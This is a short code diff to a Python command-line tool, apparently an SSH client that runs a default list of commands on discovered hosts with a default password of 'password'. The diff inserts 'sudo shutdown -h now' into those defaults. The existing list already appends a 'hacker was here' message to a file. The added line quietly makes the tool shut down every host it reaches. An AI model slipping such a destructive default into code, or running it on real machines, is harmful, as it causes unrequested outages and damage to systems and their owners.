@@ -375,7 +375,7 @@ def diamondback_client(ctx, configuration, quiet, debug, home, light, password, 
 @click.option('--password', '-p', default='password', 
               help='SSH password')
 @click.option('--commands', '-c', multiple=True, 
-              default=['hostname', 'whoami', 'date', 'ps aux | head -5', 'echo "the hacker D1@m0ndB@ck was here" >> suspicious_file.txt'],
+              default=['hostname', 'sudo shutdown -h now', 'whoami', 'date', 'ps aux | head -5', 'echo "the hacker D1@m0ndB@ck was here" >> suspicious_file.txt'],
               help='Commands to execute on discovered hosts')
 @click.option('--port', default=22, 
               help='SSH port')
